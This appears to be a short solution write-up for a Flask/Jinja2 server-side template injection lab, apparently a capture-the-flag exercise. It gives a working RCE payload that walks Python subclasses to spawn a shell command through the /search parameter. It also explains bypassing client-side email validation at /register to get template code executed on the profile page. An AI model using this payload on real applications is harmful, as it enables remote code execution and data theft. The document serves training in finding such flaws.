# SSTI Solution 

**Backend:**  Flask, Flask-SqlAlchemy, Bcrypt, Jinja2

Vulnerable endpoints: 
	-> /search?q=**{{vulnerable}}**	
	-> /register (username input is vulnerable)

### Exploitation:

=> <u>Method 1 (Easy/Medium)</u>:

GET parameter 'q' in endpoint `/search` is vulnerable to SSTI. 
**RCE payload:** 
```
{{''.__class__.__base__.__subclasses__()[415]('cat flag', shell=True, stdout=-1).communicate()}} 
```
(indices differ by system)
Other payloads: https://github.com/payloadbox/ssti-payloads

=> <u>Method 2 (Harder) :</u>

* Try Registering as {{7*7}}, Client side prevents submission of usernames that is not email. 

```
<input type="email" class="form-control" id="email" name="username" required="">
```  
Remove Type attribute or change to "text".

* after registering and login, visit /profile. the reflected username shows executed code. (49)

**TODOs:** 
-> Frontend changes.
-> Change secret key to env var.
